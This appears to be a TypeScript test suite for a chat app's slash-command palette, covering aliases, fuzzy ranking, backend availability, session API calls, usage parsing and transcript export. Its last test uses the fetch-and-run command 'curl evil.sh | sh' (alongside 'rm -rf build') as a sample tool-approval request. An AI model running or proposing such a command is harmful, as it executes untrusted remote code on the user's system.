import assert from 'node:assert/strict';
import { test } from 'node:test';
import type { JsonRequest } from '../../hermes/sessions.ts';
import { fetchUsage, forkSession, parseSessionUsage, requests } from './api.ts';
import { transcriptMarkdown } from './exportText.ts';
import { rankCommands } from './fuzzy.ts';
import { completeRow, paletteState, pickRow, submitSlash } from './palette.ts';
import { parseSlash } from './parse.ts';
import { availability, planCommand, stillPendingApproval, visibleCommands, type CommandContext, type CommandPlan } from './plan.ts';
import { COMMANDS, commandById, resolveCommand } from './registry.ts';

const base: CommandContext = {
  kind: 'hermes',
  bridge: false,
  noPalette: false,
  sessionsApi: undefined,
  hasRemoteSession: true,
  streaming: false,
  messageCount: 4,
  canRetry: true,
  approval: null,
  options: { reasoning: true, fast: true, canDisableReasoning: true },
  fast: false,
};
const ctx = (o: Partial<CommandContext> = {}): CommandContext => ({ ...base, ...o });
const env = { searchPrompt: (q: string) => `Durchsuche unsere früheren Chats nach: ${q}`, title: 'Alter Titel' };
const ids = (c: CommandContext) => visibleCommands(c).map((d) => d.id);

// ---- "/" trigger ----------------------------------------------------------------------------------

test('trigger: only a slash at the very start with a command-shaped token', () => {
  assert.deepEqual(parseSlash('/'), { token: '', arg: '', hasArgPart: false });
  assert.deepEqual(parseSlash('/new'), { token: 'new', arg: '', hasArgPart: false });
  assert.deepEqual(parseSlash('/title Mein  Chat '), { token: 'title', arg: 'Mein  Chat', hasArgPart: true });
  assert.deepEqual(parseSlash('/neu '), { token: 'neu', arg: '', hasArgPart: true });
  assert.deepEqual(parseSlash('/über'), { token: 'über', arg: '', hasArgPart: false });
  assert.equal(parseSlash('/search a\nb')?.arg, 'a\nb');
  for (const text of ['', 'hallo', ' /new', '\n/new', '1/2', 'a/b', 'https://example.com', 'siehe /etc/hosts', '~/x', '/ foo', '//', '/new/x', '/a.b', '/?']) {
    assert.equal(parseSlash(text), null, JSON.stringify(text));
  }
});

// ---- aliases ------------------------------------------------------------------------------------------

test('aliases: localized words resolve to the English command', () => {
  const cases: Record<string, string> = {
    neu: 'new', NEU: 'new', nuevo: 'new', reset: 'new', clear: 'new',
    modell: 'model', modelo: 'model',
    titel: 'title', titulo: 'title', título: 'title', rename: 'title',
    nochmal: 'retry', reintentar: 'retry',
    suche: 'search', buscar: 'search', búsqueda: 'search',
    verzweigen: 'branch', ramificar: 'branch', fork: 'branch',
    denken: 'reasoning', razonamiento: 'reasoning',
    schnell: 'fast', rápido: 'fast',
    stopp: 'stop', parar: 'stop',
    ok: 'approve', aprobar: 'approve', nein: 'deny', rechazar: 'deny',
    nutzung: 'usage', uso: 'usage',
    löschen: 'delete', loeschen: 'delete', borrar: 'delete',
    hilfe: 'help', ayuda: 'help',
  };
  for (const [word, id] of Object.entries(cases)) assert.equal(resolveCommand(word)?.id, id, word);
  assert.equal(resolveCommand('xyz'), undefined);
  assert.equal(resolveCommand(''), undefined);
  // every name/alias is unique across commands
  const seen = new Map<string, string>();
  for (const c of COMMANDS) for (const k of [c.name, ...c.hermesAliases, ...c.aliases]) {
    const f = k.toLowerCase();
    assert.ok(!seen.has(f) || seen.get(f) === c.id, `duplicate key ${k}`);
    seen.set(f, c.id);
  }
});

// ---- fuzzy ranking -----------------------------------------------------------------------------------

test('fuzzy: exact alias first, prefixes, subsequences, description fallback', () => {
  const top = (q: string) => rankCommands(q, COMMANDS, (c) => (c.id === 'usage' ? 'Token-Verbrauch dieses Chats' : ''))[0];
  assert.equal(top('neu').def.id, 'new');
  assert.equal(top('neu').via, 'neu');
  assert.equal(top('modell').def.id, 'model');
  assert.equal(top('titel').def.id, 'title');
  assert.equal(top('nochmal').def.id, 'retry');
  assert.equal(top('suche').def.id, 'search');
  assert.equal(top('verzweigen').def.id, 'branch');
  assert.equal(top('mod').def.id, 'model');
  assert.equal(top('ti').def.id, 'title');
  assert.equal(top('ne').def.id, 'new');
  assert.equal(top('st').def.id, 'stop'); // name prefix beats status (longer) and aliases
  assert.equal(top('mdl').def.id, 'model'); // subsequence
  assert.equal(top('verbrauch').def.id, 'usage'); // alias
  assert.equal(top('New').def.id, 'new');
  assert.equal(top('new').via, undefined);
  assert.deepEqual(
    rankCommands('', COMMANDS).map((r) => r.def.id),
    COMMANDS.map((c) => c.id),
  );
  assert.deepEqual(rankCommands('qqqq', COMMANDS), []);
});

// ---- availability per backend ----------------------------------------------------------------------

test('availability: Hermes direct, Hermes via bridge, other backends, no palette', () => {
  const direct = ids(ctx());
  for (const id of ['new', 'title', 'model', 'reasoning', 'fast', 'retry', 'stop', 'approve', 'deny', 'search', 'skills', 'memory', 'branch', 'usage', 'status', 'export', 'delete', 'help'] as const) {
    assert.ok(direct.includes(id), id);
  }
  // the bridge allow-list passes POST /api/sessions/{id}/fork (bridge 2026-10-12)
  assert.ok(ids(ctx({ bridge: true })).includes('branch'));
  assert.ok(ids(ctx({ bridge: true })).includes('usage'));
  // session API missing (older Hermes): no branch/usage/status
  const noApi = ids(ctx({ sessionsApi: false }));
  for (const id of ['branch', 'usage', 'status'] as const) assert.ok(!noApi.includes(id), id);
  for (const kind of ['demo'] as const) {
    const v = ids(ctx({ kind, options: null }));
    // the offline demo has Skills & memory demo data; other agents have neither
    const library = kind === 'demo' ? ['skills', 'memory'] : [];
    assert.deepEqual(v, ['new', 'model', 'retry', 'stop', 'title', ...library, 'export', 'delete', 'help'], kind);
  }
  assert.deepEqual(ids(ctx({ noPalette: true })), []);
});

test('availability: state disables (not hides) commands', () => {
  assert.deepEqual(availability('stop', ctx()), { visible: true, enabled: false, reason: 'notRunning' });
  assert.deepEqual(availability('stop', ctx({ streaming: true })), { visible: true, enabled: true });
  assert.deepEqual(availability('retry', ctx({ streaming: true })), { visible: true, enabled: false, reason: 'running' });
  assert.deepEqual(availability('approve', ctx()), { visible: true, enabled: false, reason: 'noApproval' });
  assert.deepEqual(availability('branch', ctx({ hasRemoteSession: false })), { visible: true, enabled: false, reason: 'noSession' });
  assert.deepEqual(availability('delete', ctx({ messageCount: 0 })), { visible: true, enabled: false, reason: 'empty' });
  assert.deepEqual(availability('approve', ctx({ approval: { choices: ['once', 'deny'] }, streaming: true })), { visible: true, enabled: true });
});

// ---- plans --------------------------------------------------------------------------------------------

const plan = (id: Parameters<typeof commandById>[0], arg = '', c = ctx()) => planCommand(commandById(id), arg, c, env);

test('plans: native actions and argument parsing', () => {
  assert.deepEqual(plan('new'), { type: 'newChat' });
  assert.deepEqual(plan('title', 'Urlaub 2026'), { type: 'rename', title: 'Urlaub 2026' });
  assert.deepEqual(plan('title'), { type: 'fill', text: '/title Alter Titel ' });
  assert.deepEqual(plan('model'), { type: 'openModel', query: undefined });
  assert.deepEqual(plan('model', 'qwen'), { type: 'openModel', query: 'qwen' });
  assert.deepEqual(plan('reasoning'), { type: 'openOptions' });
  assert.deepEqual(plan('reasoning', 'hoch'), { type: 'setReasoning', value: 'high' });
  assert.deepEqual(plan('reasoning', 'Alto'), { type: 'setReasoning', value: 'high' });
  assert.deepEqual(plan('reasoning', 'aus'), { type: 'setReasoning', value: 'off' });
  assert.deepEqual(plan('reasoning', 'aus', ctx({ options: { reasoning: true, fast: true, canDisableReasoning: false } })), { type: 'error', key: 'badArg' });
  assert.deepEqual(plan('reasoning', 'banana'), { type: 'error', key: 'badArg' });
  assert.deepEqual(plan('fast'), { type: 'setFast', value: true });
  assert.deepEqual(plan('fast', '', ctx({ fast: true })), { type: 'setFast', value: false });
  assert.deepEqual(plan('fast', 'aus', ctx({ fast: true })), { type: 'setFast', value: false });
  assert.deepEqual(plan('stop'), { type: 'error', key: 'notRunning' });
  assert.deepEqual(plan('stop', '', ctx({ streaming: true })), { type: 'stop' });
  assert.deepEqual(plan('retry'), { type: 'retry' });
  const ap = ctx({ approval: { choices: ['once', 'session', 'always', 'deny'] } });
  assert.deepEqual(plan('approve', '', ap), { type: 'approve', choice: 'once', confirm: false });
  assert.deepEqual(plan('approve', 'sitzung', ap), { type: 'approve', choice: 'session', confirm: false });
  assert.deepEqual(plan('approve', 'immer', ap), { type: 'approve', choice: 'always', confirm: true });
  assert.deepEqual(plan('approve', 'always', ctx({ approval: { choices: ['once', 'deny'] } })), { type: 'error', key: 'badArg' });
  assert.deepEqual(plan('deny', '', ap), { type: 'deny' });
  assert.deepEqual(plan('search', 'Steuer 2025'), { type: 'sendText', text: 'Durchsuche unsere früheren Chats nach: Steuer 2025', label: 'search' });
  assert.deepEqual(plan('search'), { type: 'fill', text: '/search ' });
  assert.deepEqual(plan('usage', '', ctx({ kind: 'demo' })), { type: 'error', key: 'unavailable' });
});

test('never sends raw slash text: plans for every command/argument/backend', () => {
  const contexts: CommandContext[] = [];
  for (const kind of ['hermes', 'demo'] as const) {
    for (const streaming of [false, true]) {
      contexts.push(ctx({ kind, streaming, approval: { choices: ['once', 'session', 'always', 'deny'] } }), ctx({ kind, streaming, bridge: true, hasRemoteSession: false, messageCount: 0, options: null }));
    }
  }
  const args = ['', 'x', '/new', 'hoch', '/model qwen'];
  for (const c of contexts) {
    for (const def of COMMANDS) {
      for (const arg of args) {
        const p: CommandPlan = planCommand(def, arg, c, env);
        if (p.type === 'sendText') {
          assert.equal(p.label, 'search');
          assert.ok(!p.text.startsWith('/'), p.text);
        }
      }
    }
  }
});

// ---- palette / submit -------------------------------------------------------------------------------

test('submit: commands run, unknown "/xyz" asks, ordinary text is sent', () => {
  const visible = visibleCommands(ctx());
  assert.deepEqual(submitSlash('hallo', visible), { action: 'send' });
  assert.deepEqual(submitSlash('1/2 Tasse', visible), { action: 'send' });
  assert.deepEqual(submitSlash('https://x.y/z', visible), { action: 'send' });
  assert.deepEqual(submitSlash('~/notes.txt', visible), { action: 'send' });
  assert.equal(submitSlash('/new', visible).action, 'run');
  const neu = submitSlash('/neu', visible);
  assert.ok(neu.action === 'run' && neu.def.id === 'new');
  const titel = submitSlash('/titel Urlaub', visible);
  assert.ok(titel.action === 'run' && titel.def.id === 'title' && titel.arg === 'Urlaub');
  assert.deepEqual(submitSlash('/title', visible), { action: 'fill', text: '/title ' });
  assert.deepEqual(submitSlash('/xyz hallo', visible), { action: 'choose' });
  assert.deepEqual(submitSlash('/', visible), { action: 'choose' });
  const bridged = submitSlash('/branch', visibleCommands(ctx({ bridge: true })));
  assert.ok(bridged.action === 'run' && bridged.def.id === 'branch');
  // /approve via the Spanish alias with an argument
  const ap = submitSlash('/aprobar siempre', visible);
  assert.ok(ap.action === 'run' && ap.def.id === 'approve' && ap.arg === 'siempre');
});

test('palette rows: suggestions, explicit "send as text", pick/complete', () => {
  const visible = visibleCommands(ctx());
  assert.equal(paletteState('hallo', visible), null);
  assert.equal(paletteState('/', visible)?.rows.length, 8);
  assert.ok(paletteState('/', visible)?.rows.every((r) => r.kind === 'command'));
  const neu = paletteState('/neu', visible)!;
  assert.equal(neu.rows[0].kind === 'command' && neu.rows[0].def.id, 'new');
  assert.ok(!neu.rows.some((r) => r.kind === 'sendRaw'), 'exact alias → no send-as-text row');
  const xyz = paletteState('/xyz', visible)!;
  assert.deepEqual(xyz.rows[xyz.rows.length - 1], { kind: 'sendRaw', text: '/xyz' });
  const withArg = paletteState('/xyz etwas', visible)!;
  assert.deepEqual(withArg.rows[withArg.rows.length - 1], { kind: 'sendRaw', text: '/xyz etwas' });
  const exact = paletteState('/modell qwen', visible)!;
  assert.deepEqual(exact.rows.map((r) => r.kind === 'command' && r.def.id), ['model']);
  // pick
  assert.deepEqual(pickRow(neu.rows[0], neu.input), { action: 'run', def: commandById('new'), arg: '' });
  const ti = paletteState('/ti', visible)!;
  assert.deepEqual(pickRow(ti.rows[0], ti.input), { action: 'fill', text: '/title ' });
  assert.deepEqual(pickRow(exact.rows[0], exact.input), { action: 'run', def: commandById('model'), arg: 'qwen' });
  assert.deepEqual(pickRow(xyz.rows[xyz.rows.length - 1], xyz.input), { action: 'sendRaw', text: '/xyz' });
  // tab completion
  assert.equal(completeRow(neu.rows[0], neu.input), '/new');
  const mod = paletteState('/mod', visible)!;
  assert.equal(completeRow(mod.rows[0], mod.input), '/model ');
  assert.equal(completeRow(exact.rows[0], exact.input), '/model qwen');
  assert.equal(completeRow({ kind: 'sendRaw', text: '/x' }, xyz.input), null);
  // no palette: nothing visible → only the explicit send row for "/x"
  assert.deepEqual(paletteState('/x', [])?.rows, [{ kind: 'sendRaw', text: '/x' }]);
});

// ---- API mapping -------------------------------------------------------------------------------------

test('API builders: paths, methods, bodies', () => {
  assert.deepEqual(requests.rename('api_1', 'Neu'), { method: 'PATCH', path: '/api/sessions/api_1', body: { title: 'Neu' } });
  assert.deepEqual(requests.fork('api_1'), { method: 'POST', path: '/api/sessions/api_1/fork', body: {} });
  assert.deepEqual(requests.fork('a b', 'T'), { method: 'POST', path: '/api/sessions/a%20b/fork', body: { title: 'T' } });
  assert.deepEqual(requests.session('hui_x:1'), { method: 'GET', path: '/api/sessions/hui_x%3A1' });
});

test('usage parser keeps tokens and drops cost fields', () => {
  const u = parseSessionUsage({
    object: 'hermes.session',
    session: {
      id: 's1', title: 'T', model: 'qwen', message_count: 6, tool_call_count: 2, api_call_count: 4,
      input_tokens: 1200, output_tokens: 300, cache_read_tokens: 800, cache_write_tokens: 0, reasoning_tokens: 50,
      estimated_cost_usd: 0.12, actual_cost_usd: 0.11, started_at: 1_760_000_000, last_active: 1_760_000_100.5, end_reason: 'branched',
    },
  })!;
  assert.deepEqual(u.tokens, { input: 1200, output: 300, cacheRead: 800, cacheWrite: 0, reasoning: 50, total: 1500 });
  assert.equal(u.startedAt, 1_760_000_000_000);
  assert.equal(u.endReason, 'branched');
  assert.ok(!JSON.stringify(u).includes('cost'));
  assert.ok(!JSON.stringify(u).includes('0.12'));
  assert.equal(parseSessionUsage({}), null);
  assert.deepEqual(parseSessionUsage({ session: { id: 'x' } })?.tokens, {});
});

test('usage and fork use the injected transport', async () => {
  const calls: unknown[][] = [];
  const fake: JsonRequest = async (method, path, body) => {
    calls.push([method, path, body]);
    if (path.endsWith('/fork')) return { object: 'hermes.session', session: { id: 'api_2', title: 'T #2', source: 'api_server' } };
    return { session: { id: 's1', input_tokens: 5, output_tokens: 6 } };
  };
  assert.equal((await fetchUsage(fake, 's1'))?.tokens.total, 11);
  assert.equal((await forkSession(fake, 's1'))?.id, 'api_2');
  assert.deepEqual(calls, [
    ['GET', '/api/sessions/s1', undefined],
    ['POST', '/api/sessions/s1/fork', {}],
  ]);
});

test('/skills and /memory open the Skills & memory screen (no sheet, no request from the palette)', () => {
  assert.deepEqual(plan('skills'), { type: 'library', tab: 'skills' });
  assert.deepEqual(plan('memory'), { type: 'library', tab: 'memory' });
  assert.equal(resolveCommand('gedächtnis')?.id, 'memory');
  assert.equal(resolveCommand('memoria')?.id, 'memory');
  assert.deepEqual(availability('memory', ctx({ kind: 'demo', options: null })), { visible: true, enabled: true });
});

test('export: Markdown transcript', () => {
  const md = transcriptMarkdown(
    [
      { role: 'user', text: 'Hallo', attachments: [{ name: 'a.png' } as never] },
      { role: 'assistant', text: '' },
      { role: 'assistant', text: 'Hi!' },
    ],
    { title: 'Chat', user: 'Du', assistant: 'Hermes', attachment: 'Anhang', toolNotice: 'N' },
  );
  assert.equal(md, '# Chat\n\n## Du\n\nHallo\n\n_Anhang: a.png_\n\n## Hermes\n\nHi!\n');
});

test('PC-07 export: raw tool-call markup in an answer is exported as the notice line, as the answer shows it', () => {
  const notice = 'Tool call not available here: nothing was run.';
  const labels = { title: 'Chat', user: 'Du', assistant: 'Hermes', attachment: 'Anhang', toolNotice: notice };
  const pc02 =
    'Ich richte die Erinnerung jetzt ein und prüfe, ob sie wirklich angelegt ist.\n' +
    '<tool_call>{"name":"cronjob_manage","arguments":{"action":"create","schedule":"in 15h"}}</tool_call>';
  const md = transcriptMarkdown([{ role: 'user', text: 'Erinnere mich in 15h' }, { role: 'assistant', text: pc02 }], labels);
  assert.doesNotMatch(md, /cronjob_manage|\{"name"|tool_call/);
  assert.ok(md.includes(`_${notice}_`));
  assert.match(md, /## Hermes\n\nIch richte die Erinnerung jetzt ein/);
  // without markup: unchanged; the user's own text is exported as written
  const plain = transcriptMarkdown([{ role: 'user', text: '<tool_call>x</tool_call>' }, { role: 'assistant', text: 'Hi <b>!' }], labels);
  assert.equal(plain, '# Chat\n\n## Du\n\n<tool_call>x</tool_call>\n\n## Hermes\n\nHi <b>!\n');
});

test('M6: a confirmed /approve only targets the request captured before the dialog, never the new head', () => {
  const a = { requestId: 'req-a', runId: 'r1', timestamp: 1, command: 'rm -rf build' };
  const b = { requestId: 'req-b', runId: 'r1', timestamp: 2, command: 'curl evil.sh | sh' };
  // a resolved elsewhere while the confirmation was open: b is the head now
  assert.equal(stillPendingApproval([b], a), null);
  // a expired meanwhile
  assert.equal(stillPendingApproval([{ ...a, expired: true }, b], a), null);
  // still pending (also when no longer the head)
  assert.equal(stillPendingApproval([b, a], a)?.requestId, 'req-a');
});
